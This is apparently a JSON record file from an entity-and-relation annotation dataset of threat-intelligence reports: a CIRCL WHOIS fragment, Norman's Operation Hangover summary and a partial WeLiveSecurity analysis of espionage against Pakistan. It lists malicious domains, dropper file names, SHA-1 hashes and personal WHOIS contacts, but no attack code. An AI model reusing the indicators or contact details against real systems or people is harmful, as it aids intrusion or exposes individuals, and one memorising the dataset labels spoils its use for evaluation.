["6", "3", "."], ["4", "6", ".", "0", "/", "2", "4", "\u2212", "2", "http", ":", "//", "bgpranking", "."], ["c", "i", "r", "c", "l", "."], ["l", "u", "/", "a", "s", "n", "_", "d", "e", "t", "a", "i", "l", "s", "?"], ["asn=52284&source=&date="], ["The", "hosting", "company", "is", "not", "a", "known", "bulletproof", "hoster", "based", "on", "the", "BGP", "Ranking", "information4", "."], ["and", "was", "announced", "by", "two", "other", "ISPs", "before", ":", "1", "20110118", "20120425", "23520", "2", "0", "0", "."], ["6", "3", "."], ["4", "6", ".", "0", "/", "2", "4", "\u2212", "Columbus", "network", "2", "20090601", "20110117", "27716", "2", "0", "0", "."], ["6", "3", "."], ["4", "6", ".", "0", "/", "2", "4", "\u2212", "Advanced", "Communication", "Network", ",", "S", ".A."], ["WHOIS", "Panamaserver.com", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "inetnum", ":", "200.6", "3", "."], ["40/21", "status", ":", "allocated"], ["aut\u2212num", ":", "N", "/", "A", "owner", ":", "Panamaserver", "."], ["com", "ownerid", ":", "PA\u2212PANA2\u2212LACNIC", "r", "e", "s", "p", "o", "n", "s", "i", "b", "l", "e", ":", "Ch", "Group", "Corp", "."], ["address", ":", "B", "e", "l", "l", "a", "Vista", ",", "El", "cangrejo", ",", "C", "a", "l", "l", "e", "49", ",", "0", ",", "address", ":", "00000", "\u2212", "Panama", "\u2212", "country", ":", "PA", "phone", ":", "+507", "263", "3723", "[", "]"], ["owner\u2212c", ":", "MAC30", "tech\u2212c", ":"], ["MAC30", "abuse\u2212c", ":"], ["MAC30", "i", "n", "e", "t", "r", "e", "v", ":", "2", "00", "."], ["63.4", "6/24", "n", "s", "e", "r", "v", "e", "r", ":", "NS1", ".PANAMASERVER.COM"], ["4"], ["http://bgpranking.circl.lu/asn_details?date=2012-12-08;asn=52284", "Page", "11", "of", "12", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d", "GIE", "41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "16"], ["17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "July", "3", ",", "2014", "n", "s", "s", "t", "a", "t", ":", "20130311", "AA", "n", "s", "l", "a", "s", "t", "a", "a", ":", "20130311"], ["c", "r", "e", "a", "t", "e", "d", ":", "20080328", "changed", ":", "20080328"], ["nic\u2212hdl", ":", "MAC30", "person", ":", "Manuel", "I", ".", "Cabrera", "Ch", "."], ["e\u2212mail", ":", "ABUSE@PANAMASERVER.COM", "address", ":", "B", "e", "l", "l", "a", "Vista", "C", "a", "l", "l", "e", "39A", "y", "Ave", "Cuba", ",", "0", ",", "address", ":", "0000", "\u2212", "Panama", "\u2212", "PA", "country", ":", "PA", "phone", ":", "+507", "8322443", "[", "]", "c", "r", "e", "a", "t", "e", "d", ":", "20071004", "changed", ":", "20120311", "Page", "12", "of", "12"], ["CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d", "GIE", "41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu"]]}, {"vertexSet": [[{"name": "HANGOVER", "pos": [1, 2], "sent_id": 0, "type": "Campaign"}], [{"name": "India", "pos": [12, 13], "sent_id": 1, "type": "Country"}], [{"name": "Pakistan", "pos": [28, 29], "sent_id": 2, "type": "ExploitTargetObject"}], [{"name": "United States", "pos": [33, 35], "sent_id": 2, "type": "ExploitTargetObject"}], [{"name": "Telenor", "pos": [12, 13], "sent_id": 3, "type": "Organization"}], [{"name": "March 17, 2013", "pos": [1, 5], "sent_id": 5, "type": "Time"}], [{"name": "Spear phishing emails", "pos": [0, 3], "sent_id": 6, "type": "Exploit"}], [{"name": "Norman Shark", "pos": [7, 9], "sent_id": 7, "type": "Organization"}], [{"name": "HangOver", "pos": [2, 3], "sent_id": 8, "type": "Campaign"}], [{"name": "Pakistan", "pos": [34, 35], "sent_id": 12, "type": "ExploitTargetObject"}], [{"name": "Iran", "pos": [36, 37], "sent_id": 12, "type": "ExploitTargetObject"}], [{"name": "United States", "pos": [40, 42], "sent_id": 12, "type": "ExploitTargetObject"}], [{"name": "Hangover", "pos": [30, 31], "sent_id": 19, "type": "Campaign"}], [{"name": "Hangover", "pos": [1, 2], "sent_id": 23, "type": "Campaign"}], [{"name": "China", "pos": [9, 10], "sent_id": 27, "type": "Country"}], [{"name": "Hangover", "pos": [20, 21], "sent_id": 27, "type": "Campaign"}], [{"name": "India", "pos": [28, 29], "sent_id": 27, "type": "Country"}], [{"name": "Telenor", "pos": [9, 10], "sent_id": 31, "type": "Organization"}], [{"name": "Pakistani", "pos": [4, 5], "sent_id": 33, "type": "ExploitTargetObject"}], [{"name": "US", "pos": [6, 7], "sent_id": 33, "type": "ExploitTargetObject"}]], "labels": [{"r": "P32", "h": 0, "t": 1, "evidence": [0, 1]}, {"r": "P27", "h": 0, "t": 2, "evidence": [0, 2]}, {"r": "P27", "h": 0, "t": 3, "evidence": [0, 2]}, {"r": "P22", "h": 0, "t": 6, "evidence": [0, 6]}, {"r": "P27", "h": 8, "t": 9, "evidence": [8, 12]}, {"r": "P27", "h": 8, "t": 10, "evidence": [8, 12]}, {"r": "P27", "h": 8, "t": 11, "evidence": [8, 12]}, {"r": "P32", "h": 13, "t": 14, "evidence": [23, 27]}, {"r": "P32", "h": 15, "t": 16, "evidence": [27]}, {"r": "P27", "h": 15, "t": 18, "evidence": [27, 33]}, {"r": "P27", "h": 15, "t": 19, "evidence": [27, 33]}], "title": "201305NormanHangover", "sents": [["OPERATION", "HANGOVER", "|Executive", "Summary", "Unveiling", "an", "Indian", "Cyberattack", "Infrastructure"], ["This", "report", "details", "a", "sophisticated", "cyberattack", "infrastructure", "that", "appears", "to", "originate", "from", "India", ",", "conducted", "by", "private", "threat", "actors", "with", "no", "evidence", "of", "state", "-", "sponsorship", "."], ["It", "has", "likely", "been", "in", "operation", "for", "over", "three", "years", ",", "primarily", "as", "a", "platform", "for", "surveillance", "against", "targets", "of", "national", "security", "interest", "that", "are", "mostly", "based", "in", "Pakistan", "and", "possibly", "in", "the", "United", "States", "."], ["It", "is", "also", "used", "for", "industrial", "espionage", "against", "the", "Norwegian", "telecom", "corporation", "Telenor", "and", "other", "civilian", "corporations", "."], ["Evidence", "points", "to", "professional", "project", "management", "and", "outsourcing", "of", "key", "tasks", ",", "including", "some", "by", "freelance", "programmers", "."], ["On", "March", "17", ",", "2013", "a", "Norwegian", "newspaper", "reported", "that", "the", "country", "\u2019s", "telecommunications", "giant", "Telenor", "had", "filed", "a", "criminal", "police", "case", "for", "an", "unlawful", "computer", "intrusion", "."], ["Spear", "phishing", "emails", "targeting", "upper", "management", "appeared", "to", "be", "the", "source", "of", "the", "infection"], ["Through", "extensive", "analysis", ",", "security", "analysts", "at", "Norman", "Shark", "in", "conjunction", "with", "our", "partners", ",", "quickly", "uncovered", "a", "previously", "unknown", "and", "sophisticated", "infrastructure", "for", "targeted", "attacks", "."], ["Norman", "Confidential", "HangOver", "Report", "Executive", "Summary", "4/25/2013", "Cyberattack", "Objectives"], ["The", "primary", "purpose", "of", "this", "long", "-", "running", ",", "global", "command", "-", "and", "-", "control", "network", "appears", "to", "be", "surveillance", "against", "national", "security", "interests", "."], ["Privatesector", "industrial", "espionage", "in", "fields", "as", "diverse", "as", "natural", "resources", ",", "telecommunications", ",", "law", ",", "food", "&", "restaurants", ",", "and", "manufacturing", "is", "likely", "a", "secondary", "purpose", "of", "this", "network", "."], ["Target", "Selection"], ["Based", "on", "analysis", "of", "IP", "addresses", "collected", "from", "criminal", "data", "stores", "discovered", "during", "the", "investigation", ",", "it", "appears", "that", "potential", "victims", "have", "been", "targeted", "in", "over", "a", "dozen", "countries", ",", "most", "heavily", "represented", "by", "Pakistan", ",", "Iran", ",", "and", "the", "United", "States", "."], ["Targets", "include", "government", ",", "military", ",", "and", "civilian", "organizations"], ["Highly", "-", "Targeted", "Social", "Engineering", "Tactics", "Spear", "phishing", "to", "carefully", "-", "selected", "target", "individuals", "was", "the", "primary", "attack", "vector", "identified", "in", "the", "investigation", "."], ["The", "attackers", "went", "to", "great", "lengths", "to", "make", "the", "social", "engineering", "aspects", "of", "the", "attack", "appear", "as", "credible", "and", "applicable", "as", "possible", "."], ["In", "many", "cases", ",", "decoy", "files", "and", "websites", "were", "used", ",", "specifically", "geared", "to", "the", "particular", "sensibilities", "of", "regional", "targets", "including", "cultural", "and", "religious", "subject", "matter", "."], ["Victims", "would", "click", "on", "what", "appeared", "to", "be", "an", "interesting", "document", ",", "and", "begin", "the", "long", "-", "running", "infection", "cycle", "."], ["Exploit", "Tools", "and", "Techniques"], ["Despite", "all", "of", "the", "recent", "media", "attention", "on", "so", "-", "called", "\u201c", "zero", "-", "day", "\u201d", "exploits", "encompassing", "brand", "new", ",", "never", "-", "before", "-", "seen", "attack", "methods", ",", "Operation", "Hangover", "appears", "to", "have", "relied", "exclusively", "upon", "well", "-", "known", ",", "previously", "identified", "vulnerabilities", "in", "Java", ",", "Word", "documents", ",", "and", "web", "browsers", "."], ["Favored", "methods", "include", "documents", "infected", "with", "malicious", "code", ",", "along", "with", "direction", "to", "malicious", "websites", "with", "names", "deliberately", "similar", "to", "legitimate", "government", ",", "entertainment", ",", "security", "related", ",", "and", "commercial", "sites", "."], ["Often", "the", "user", "would", "be", "presented", "with", "a", "legitimate", "document", "or", "software", "download", "they", "were", "expecting", "to", "see", ",", "along", "with", "an", "unseen", "malicious", "download", "."], ["Infrastructure", "Development"], ["Operation", "Hangover", "utilizes", "a", "very", "extensive", "and", "sophisticated", "command", "-", "andcontrol", "infrastructure", ",", "likely", "developed", "over", "many", "months", "or", "years", "by", "numerous", "developers", "."], ["Our", "investigation", "revealed", "evidence", "of", "professional", "project", "management", "practices", "used", "to", "design", "frameworks", ",", "modules", ",", "and", "subcomponents", "."], ["Individual", "malware", "authors", "were", "assigned", "certain", "tasks", ",", "and", "components", "were", "\u201c", "outsourced", "\u201d", "to", "what", "appear", "to", "be", "freelance", "programmers", "."], ["Attribution", "of", "Responsibility"], ["In", "recent", "months", ",", "much", "focus", "has", "been", "on", "China", "\u2013", "including", "both", "statesponsored", "and", "individual", "actors", "\u2013", "but", "Operation", "Hangover", "contains", "notable", "hallmarks", "of", "originating", "exclusively", "in", "India", "."], ["We", "base", "this", "attribution", "with", "a", "very", "high", "degree", "of", "confidence", "on", "our", "extensive", "analysis", "of", "IP", "addresses", ",", "website", "domain", "registrations", ",", "and", "text", "-", "based", "identifiers", "contained", "within", "the", "malicious", "code", "itself", "."], ["All", "indications", "point", "to", "private", "syndicates", "of", "threat", "actors", "following", "their", "own", "motivations", ",", "with", "no", "direct", "evidence", "of", "state", "-", "sponsorship", "by", "the", "Indian", "government", "or", "by", "any", "other", "nation", "."], ["Norman", "Confidential", "ATTACK", "OVERVIEW", "\u00b7", "\u00b7", "\u00b7"], ["Discovery", "of", "a", "security", "breach", "at", "Norway", "-", "based", "Telenor", "uncovered", "a", "long", "running", ",", "sophisticated", "global", "cyberattack", "infrastructure", "that", "likely", "continues", "to", "this", "day", "."], ["Cyberattack", "Objectives", "\uf0b7", "National", "security", "interests", "\uf0b7", "Industrial", "espionage"], ["Target", "Selection", "\uf0b7", "Primarily", "Pakistani", "and", "US", "-", "based", "targets", "\uf0b7", "Business", "targets"], ["Highly", "-", "Targeted", "Social", "Engineering", "Tactics", "\uf0b7", "Executables", "disguised", "as", "documents", "\uf0b7", "Malicious", "web", "downloads", "Exploit", "Tools", "and", "Techniques", "\uf0b7", "Known", "vulnerabilities", "only", "\uf0b7"], ["No", "use", "of", "zero", "-", "day", "exploits"], ["Infrastructure", "Development", "\uf0b7", "Evidence", "of", "professional", "project", "management", "\uf0b7", "Outsourcing", "of", "development"], ["Attribution", "of", "Responsibility", "\uf0b7", "Individual", "actors", "likely", "based", "in", "India", "\uf0b7", "Private", "data", "security", "firms", "hired", "to", "build", "specific", "infrastructure", "components", "\uf0b7", "No", "evidence", "of", "state", "-", "sponsored", "activity", "Contact", "information", ":", "Gary", "Thompson", ",", "925.768.2400"], ["Tim", "Johnson", ",", "415.385.9537", "norman@claritycommunications.us"], ["HangOver", "Report", "Executive", "Summary", "4/25/2013"]]}, {"vertexSet": [[{"name": "South Asia", "pos": [5, 7], "sent_id": 0, "type": "Region"}], [{"name": "Pakistan", "pos": [26, 27], "sent_id": 1, "type": "ExploitTargetObject"}], [{"name": "campaign", "pos": [11, 12], "sent_id": 3, "type": "Campaign"}], [{"name": "Pakistan", "pos": [28, 29], "sent_id": 3, "type": "ExploitTargetObject"}], [{"name": "India", "pos": [18, 19], "sent_id": 4, "type": "Country"}], [{"name": "March 31st 2012", "pos": [15, 18], "sent_id": 11, "type": "Time"}], [{"name": "malicious binaries", "pos": [8, 10], "sent_id": 13, "type": "Malware"}], [{"name": "attackers", "pos": [7, 8], "sent_id": 16, "type": "Attacker"}], [{"name": "March until June 2012", "pos": [14, 18], "sent_id": 16, "type": "Time"}], [{"name": "beginning of July until the beginning of August 2012", "pos": [12, 21], "sent_id": 17, "type": "Time"}], [{"name": "August and September 2012", "pos": [18, 22], "sent_id": 18, "type": "Time"}], [{"name": "campaign", "pos": [22, 23], "sent_id": 20, "type": "Campaign"}], [{"name": "early 2011", "pos": [9, 11], "sent_id": 21, "type": "Time"}], [{"name": "CVE-2012-0158", "pos": [10, 13], "sent_id": 23, "type": "Vulnerability"}], [{"name": "feds.comule.com", "pos": [12, 13], "sent_id": 26, "type": "Indicator"}], [{"name": "malicious binary", "pos": [17, 19], "sent_id": 26, "type": "Malware"}], [{"name": "digitalapp.org", "pos": [20, 21], "sent_id": 26, "type": "Indicator"}], [{"name": "email", "pos": [21, 22], "sent_id": 27, "type": "Email"}], [{"name": "Pakistan", "pos": [17, 18], "sent_id": 33, "type": "ExploitTargetObject"}], [{"name": "pakistandefencetoindiantopmiltrysecreat.exe", "pos": [14, 15], "sent_id": 35, "type": "File"}], [{"name": "pakterrisiomforindian.exe", "pos": [11, 12], "sent_id": 36, "type": "File"}], [{"name": "August 2011", "pos": [11, 13], "sent_id": 38, "type": "Time"}], [{"name": "Pakistan", "pos": [17, 18], "sent_id": 38, "type": "ExploitTargetObject"}], [{"name": "droppers", "pos": [10, 11], "sent_id": 40, "type": "Malware"}], [{"name": "Downloader", "pos": [2, 3], "sent_id": 42, "type": "Payload"}], [{"name": "Document uploader", "pos": [0, 2], "sent_id": 45, "type": "Payload"}], [{"name": "System information gathering", "pos": [0, 3], "sent_id": 46, "type": "Payload"}], [{"name": "Keylogger", "pos": [26, 27], "sent_id": 47, "type": "Payload"}], [{"name": "Screenshot", "pos": [0, 1], "sent_id": 49, "type": "Payload"}], [{"name": "Connect-back shell", "pos": [0, 4], "sent_id": 50, "type": "Payload"}], [{"name": "Public Tools", "pos": [0, 2], "sent_id": 52, "type": "Payload"}], [{"name": "WebPassView", "pos": [6, 7], "sent_id": 53, "type": "Software"}], [{"name": "Mail PassView", "pos": [8, 10], "sent_id": 53, "type": "Software"}], [{"name": "NirSoft", "pos": [12, 13], "sent_id": 53, "type": "Organization"}], [{"name": "Selfreplication through removable drives", "pos": [1, 5], "sent_id": 55, "type": "Payload"}], [{"name": "malware files", "pos": [13, 15], "sent_id": 55, "type": "Malware"}], [{"name": "examining your HTTP network traffic", "pos": [22, 27], "sent_id": 60, "type": "CourseOfAction"}], [{"name": "ROT-1", "pos": [15, 16], "sent_id": 67, "type": "Obfuscation"}], [{"name": "gjmftbttpdjbuf/ofu", "pos": [23, 26], "sent_id": 67, "type": "Indicator"}], [{"name": "campaign", "pos": [41, 42], "sent_id": 67, "type": "Campaign"}], [{"name": "wearwellgarments.eu", "pos": [4, 5], "sent_id": 75, "type": "Indicator"}], [{"name": "secuina.com", "pos": [8, 9], "sent_id": 75, "type": "Indicator"}], [{"name": "campaign", "pos": [2, 3], "sent_id": 78, "type": "Campaign"}], [{"name": "India", "pos": [6, 7], "sent_id": 79, "type": "Country"}], [{"name": "5:06 and 13:45 UTC", "pos": [9, 13], "sent_id": 81, "type": "Time"}], [{"name": "malware authors", "pos": [27, 29], "sent_id": 82, "type": "Attacker"}], [{"name": "ramukaka", "pos": [7, 8], "sent_id": 84, "type": "Indicator"}], [{"name": "campaign", "pos": [9, 10], "sent_id": 87, "type": "Campaign"}], [{"name": "India", "pos": [9, 10], "sent_id": 89, "type": "Country"}], [{"name": "Pakistan", "pos": [5, 6], "sent_id": 91, "type": "ExploitTargetObject"}], [{"name": "campaign", "pos": [11, 12], "sent_id": 91, "type": "Campaign"}], [{"name": "Ukraine", "pos": [0, 1], "sent_id": 95, "type": "Country"}], [{"name": "Kazakhstan", "pos": [2, 3], "sent_id": 95, "type": "Country"}], [{"name": "Pakistan", "pos": [20, 21], "sent_id": 101, "type": "ExploitTargetObject"}], [{"name": "campaigns", "pos": [25, 26], "sent_id": 102, "type": "Campaign"}], [{"name": "CVE-2012-0158", "pos": [3, 6], "sent_id": 105, "type": "Vulnerability"}], [{"name": "3b1d9d65159bea24ab1060e5603f9e3c2d38d08d", "pos": [9, 10], "sent_id": 105, "type": "SHA-1"}], [{"name": "pakterrisiomforindian.exe", "pos": [11, 12], "sent_id": 105, "type": "Payload"}], [{"name": "pakistandefencetoindiantopmiltrysecreat.exe", "pos": [14, 15], "sent_id": 105, "type": "Payload"}], [{"name": "1db89237ef786c7f22a8d4cd7eccda8f6286a6de", "pos": [16, 17], "sent_id": 105, "type": "SHA-1"}], [{"name": "Downloader", "pos": [18, 19], "sent_id": 105, "type": "Payload"}], [{"name": "Document uploader", "pos": [21, 23], "sent_id": 105, "type": "Payload"}], [{"name": "System information gathering", "pos": [25, 28], "sent_id": 105, "type": "Payload"}], [{"name": "Keylogger", "pos": [30, 31], "sent_id": 105, "type": "Payload"}], [{"name": "Screenshot", "pos": [33, 34], "sent_id": 105, "type": "Payload"}], [{"name": "Connect-back shell", "pos": [36, 40], "sent_id": 105, "type": "Payload"}], [{"name": "Self-replication through removable drives", "pos": [42, 48], "sent_id": 105, "type": "Payload"}], [{"name": "20A29D1F89C07BAFBB4C61CE208531D68125C8E", "pos": [49, 50], "sent_id": 105, "type": "SHA-1"}], [{"name": "d859f1cf99049f89258c1faa59dcd97f587e45ac", "pos": [50, 51], "sent_id": 105, "type": "SHA-1"}], [{"name": "08ce405f0a0277de355454862b164ffd94a7ea36", "pos": [51, 52], "sent_id": 105, "type": "SHA-1"}], [{"name": "DB22E7DEA0C1CAF203072693485DE4E4FD2CB56A", "pos": [0, 1], "sent_id": 106, "type": "SHA-1"}], [{"name": "0D610F3F51750EADCF426E10E6DE5313605400FA", "pos": [0, 1], "sent_id": 107, "type": "SHA-1"}], [{"name": "AE7B9CFB10CD65B98C59DC012D6726B66BE92897", "pos": [1, 2], "sent_id": 107, "type": "SHA-1"}], [{"name": "A0DD0B8FD0C98E917BFDC96182088CAB5505CCD2", "pos": [2, 3], "sent_id": 107, "type": "SHA-1"}], [{"name": "09D4ECA67B1D071E57C5951D97FE9DD9C62F1580", "pos": [3, 4], "sent_id": 107, "type": "SHA-1"}], [{"name": "Win32/Agent.NLD", "pos": [12, 17], "sent_id": 108, "type": "GeneralVirus"}], [{"name": "Win32/Spy.Agent.NZD", "pos": [0, 7], "sent_id": 109, "type": "TrojanHorse"}], [{"name": "Win32/Spy.Agent.OBF", "pos": [9, 16], "sent_id": 109, "type": "TrojanHorse"}], [{"name": "Win32/Spy.Agent.OBV", "pos": [18, 25], "sent_id": 109, "type": "TrojanHorse"}], [{"name": "Win32/Spy.KeyLogger.NZL", "pos": [27, 34], "sent_id": 109, "type": "TrojanHorse"}], [{"name": "Win32/Spy.KeyLogger.NZN", "pos": [36, 43], "sent_id": 109, "type": "TrojanHorse"}], [{"name": "Win32/Spy.VB.NOF", "pos": [45, 50], "sent_id": 109, "type": "TrojanHorse"}], [{"name": "Win32/Spy.VB.NRP", "pos": [52, 57], "sent_id": 109, "type": "TrojanHorse"}], [{"name": "Win32/TrojanDownloader.Agent.RNT", "pos": [59, 66], "sent_id": 109, "type": "TrojanHorse"}], [{"name": "Win32/TrojanDownloader.Agent.RNV", "pos": [68, 75], "sent_id": 109, "type": "TrojanHorse"}], [{"name": "Win32/TrojanDownloader.Agent.RNW", "pos": [77, 84], "sent_id": 109, "type": "TrojanHorse"}], [{"name": "Win32/VB.NTC", "pos": [86, 89], "sent_id": 109, "type": "TrojanHorse"}], [{"name": "Win32/VB.NVM", "pos": [91, 94], "sent_id": 109, "type": "TrojanHorse"}], [{"name": "Win32/VB.NWB", "pos": [96, 99], "sent_id": 109, "type": "TrojanHorse"}], [{"name": "Win32/VB.QPK", "pos": [101, 104], "sent_id": 109, "type": "TrojanHorse"}], [{"name": "Win32/VB.QTV", "pos": [0, 3], "sent_id": 110, "type": "TrojanHorse"}], [{"name": "Win32/VB.QTY", "pos": [5, 8], "sent_id": 110, "type": "TrojanHorse"}], [{"name": "Win32/Spy.Agent.NVL", "pos": [10, 17], "sent_id": 110, "type": "TrojanHorse"}], [{"name": "Win32/Spy.Agent.OAZ", "pos": [19, 26], "sent_id": 110, "type": "TrojanHorse"}], [{"name": "Jean-Ian Boutin", "pos": [27, 31], "sent_id": 110, "type": "Person"}], [{"name": "16 May 2013 - 10:15AM", "pos": [31, 36], "sent_id": 110, "type": "Time"}]], "labels": [{"r": "P9", "h": 17, "t": 19, "evidence": [27, 35]}, {"r": "P9", "h": 17, "t": 20, "evidence": [27, 36]}, {"r": "P17", "h": 33, "t": 32, "evidence": [53]}, {"r": "P17", "h": 33, "t": 31, "evidence": [53]}, {"r": "P32", "h": 42, "t": 43, "evidence": [78, 79]}, {"r": "P33", "h": 42, "t": 44, "evidence": [78, 81]}, {"r": "P32", "h": 47, "t": 48, "evidence": [87, 89]}, {"r": "P27", "h": 50, "t": 49, "evidence": [91]}, {"r": "P27", "h": 54, "t": 53, "evidence": [101, 102]}, {"r": "P27", "h": 2, "t": 1, "evidence": [1, 3]}, {"r": "P32", "h": 2, "t": 0, "evidence": [0, 3]}, {"r": "P27", "h": 2, "t": 3, "evidence": [3]}, {"r": "P32", "h": 2, "t": 4, "evidence": [3, 4]}, {"r": "P33", "h": 7, "t": 8, "evidence": [16]}, {"r": "P2", "h": 7, "t": 6, "evidence": [13, 16]}, {"r": "P33", "h": 7, "t": 10, "evidence": [16, 18]}, {"r": "P33", "h": 7, "t": 12, "evidence": [16, 21]}, {"r": "P7", "h": 6, "t": 13, "evidence": [13, 23]}, {"r": "P21", "h": 14, "t": 15, "evidence": [26]}, {"r": "P21", "h": 16, "t": 15, "evidence": [26]}, {"r": "P21", "h": 17, "t": 15, "evidence": [26, 27]}, {"r": "P13", "h": 23, "t": 24, "evidence": [40, 42]}, {"r": "P33", "h": 23, "t": 21, "evidence": [38, 40]}, {"r": "P13", "h": 23, "t": 25, "evidence": [40, 45]}, {"r": "P13", "h": 23, "t": 26, "evidence": [40, 46]}, {"r": "P13", "h": 23, "t": 27, "evidence": [40, 47]}, {"r": "P13", "h": 23, "t": 28, "evidence": [40, 49]}, {"r": "P13", "h": 23, "t": 29, "evidence": [40, 50]}, {"r": "P13", "h": 23, "t": 30, "evidence": [40, 52]}, {"r": "P13", "h": 23, "t": 34, "evidence": [40, 55]}, {"r": "P13", "h": 35, "t": 37, "evidence": [55, 67]}, {"r": "P21", "h": 38, "t": 35, "evidence": [55, 67]}, {"r": "P34", "h": 36, "t": 39, "evidence": [60, 67]}, {"r": "P21", "h": 40, "t": 35, "evidence": [55, 75]}, {"r": "P21", "h": 41, "t": 35, "evidence": [55, 75]}, {"r": "P23", "h": 54, "t": 75, "evidence": [102, 108]}, {"r": "P23", "h": 54, "t": 76, "evidence": [102, 109]}, {"r": "P23", "h": 54, "t": 77, "evidence": [102, 109]}, {"r": "P23", "h": 54, "t": 78, "evidence": [102, 109]}, {"r": "P23", "h": 54, "t": 79, "evidence": [102, 109]}, {"r": "P23", "h": 54, "t": 80, "evidence": [102, 109]}, {"r": "P23", "h": 54, "t": 81, "evidence": [102, 109]}, {"r": "P23", "h": 54, "t": 82, "evidence": [102, 109]}, {"r": "P23", "h": 54, "t": 83, "evidence": [102, 109]}, {"r": "P23", "h": 54, "t": 84, "evidence": [102, 109]}, {"r": "P23", "h": 54, "t": 85, "evidence": [102, 109]}, {"r": "P23", "h": 54, "t": 86, "evidence": [102, 109]}, {"r": "P23", "h": 54, "t": 87, "evidence": [102, 109]}, {"r": "P23", "h": 54, "t": 88, "evidence": [102, 109]}, {"r": "P23", "h": 54, "t": 89, "evidence": [102, 109]}, {"r": "P23", "h": 54, "t": 90, "evidence": [102, 110]}, {"r": "P23", "h": 54, "t": 91, "evidence": [102, 110]}, {"r": "P23", "h": 54, "t": 92, "evidence": [102, 110]}, {"r": "P23", "h": 54, "t": 93, "evidence": [102, 110]}, {"r": "P21", "h": 67, "t": 23, "evidence": [40, 105]}, {"r": "P21", "h": 68, "t": 23, "evidence": [40, 105]}, {"r": "P21", "h": 69, "t": 23, "evidence": [40, 105]}, {"r": "P21", "h": 70, "t": 23, "evidence": [40, 106]}, {"r": "P21", "h": 71, "t": 23, "evidence": [40, 107]}, {"r": "P21", "h": 72, "t": 23, "evidence": [40, 107]}, {"r": "P21", "h": 73, "t": 23, "evidence": [40, 107]}, {"r": "P21", "h": 74, "t": 23, "evidence": [40, 107]}], "title": "201305WeLiveSecurityPakistanAttack", "sents": [["Targeted", "information", "stealing", "attacks", "in", "South", "Asia", "use", "email", ",", "signed", "binaries", "welivesecurity.com/2013/05/16/targeted-threat-pakistan-india/"], ["May", "16", ",", "2013", "Detailed", "analysis", "of", "a", "targeted", "campaign", "that", "tries", "to", "steal", "sensitive", "information", "from", "different", "organizations", "throughout", "the", "world", ",", "but", "particularly", "in", "Pakistan", "."], ["[", "Update", ":", "Norman", "released", "a", "comprehensive", "white", "paper", "profiling", "the", "group", "behind", "these", "attacks", "]"], ["In", "the", "past", "few", "months", ",", "we", "have", "analyzed", "a", "targeted", "campaign", "that", "tries", "to", "steal", "sensitive", "information", "from", "different", "organizations", "throughout", "the", "world", ",", "but", "particularly", "in", "Pakistan", "."], ["During", "the", "course", "of", "our", "investigations", "we", "uncovered", "several", "leads", "that", "indicate", "this", "threat", "has", "its", "origin", "in", "India", "and", "has", "been", "going", "on", "for", "at", "least", "two", "years", "."], ["The", "journey", "began", "with", "a", "code", "-", "signing", "certificate", "and", "an", "exploit", "and", "the", "scope", "of", "the", "investigation", "has", "widened", "ever", "since", "."], ["In", "this", "blog", "post", ",", "we", "will", "highlight", "several", "interesting", "artifacts", "of", "the", "campaign", ",", "but", "more", "will", "be", "revealed", "in", "my", "upcoming", "presentation", "at", "the", "7th", "International", "CARO", "Workshop", "in", "mid", "-", "May.", "Code", "signing", "certificate"], ["For", "part", "of", "this", "campaign", "a", "code", "signing", "certificate", "was", "used", "to", "sign", "malicious", "binaries", "and", "improve", "their", "potential", "to", "spread", "."], ["This", "certificate", "was", "issued", "in", "late", "2011", "to", "an", "Indian", "company", "called", "Technical", "and", "Commercial", "Consulting", "Pvt", "."], ["Ltd.", ",", "based", "in", "New", "Delhi", "."], ["1/11"], ["When", "we", "started", "our", "investigation", ",", "the", "certificate", "had", "been", "revoked", "for", "files", "signed", "after", "March", "31st", "2012", "."], ["We", "contacted", "VeriSign", "with", "evidence", "that", "this", "certificate", "had", "been", "used", "maliciously", "since", "it", "was", "issued", "and", "they", "promptly", "revoked", "the", "certificate", "unconditionally", "."], ["Overall", ",", "we", "found", "more", "than", "70", "signed", "malicious", "binaries", "using", "this", "certificate", "."], ["Since", "each", "signed", "sample", "comes", "with", "an", "authoritative", "timestamp", ",", "it", "is", "possible", "to", "draw", "a", "timeline", "depicting", "when", "these", "binaries", "were", "produced", ":", "Figure", "1", "Timeline", "of", "signing", "times", "."], ["Black", "lines", "represent", "one", "sample", "signing", "time"], ["From", "the", "information", "we", "gathered", ",", "the", "attackers", "were", "actively", "signing", "malicious", "binaries", "from", "March", "until", "June", "2012", "."], ["Then", ",", "there", "is", "a", "gap", "in", "the", "timeline", ",", "from", "the", "beginning", "of", "July", "until", "the", "beginning", "of", "August", "2012", "."], ["We", "then", "see", "another", "spike", "in", "certificate", "usage", "(", "even", "though", "it", "had", "already", "been", "revoked", ")", "in", "August", "and", "September", "2012", "."], ["There", "are", "several", "possible", "explanations", "as", "to", "why", "there", "is", "a", "gap", "during", "the", "summer", "of", "2012", ",", "but", "it", "is", "likely", "that", "this", "was", "the", "off", "-", "season", "for", "both", "the", "attackers", "and", "their", "targets", "."], ["Although", "the", "investigation", "started", "with", "this", "code", "signing", "certificate", ",", "we", "then", "discovered", "several", "similar", "unsigned", "samples", "that", "were", "used", "in", "this", "campaign", "."], ["Some", "of", "them", "were", "collected", "as", "far", "back", "as", "early", "2011", "."], ["2/11", "Droppers", "and", "decoy", "documents"], ["The", "first", "infection", "vector", "we", "saw", "was", "using", "the", "famous", "CVE-2012", "-", "0158", "vulnerability", "."], ["This", "vulnerability", "can", "be", "exploited", "by", "a", "specially", "crafted", "Microsoft", "Office", "documents", "and", "allows", "arbitrary", "code", "execution", "."], ["In", "the", "case", "we", "analyzed", ",", "a", "two", "-", "stage", "shellcode", "is", "executed", "when", "the", "user", "opens", "an", "RTF", "document", "."], ["First", ",", "the", 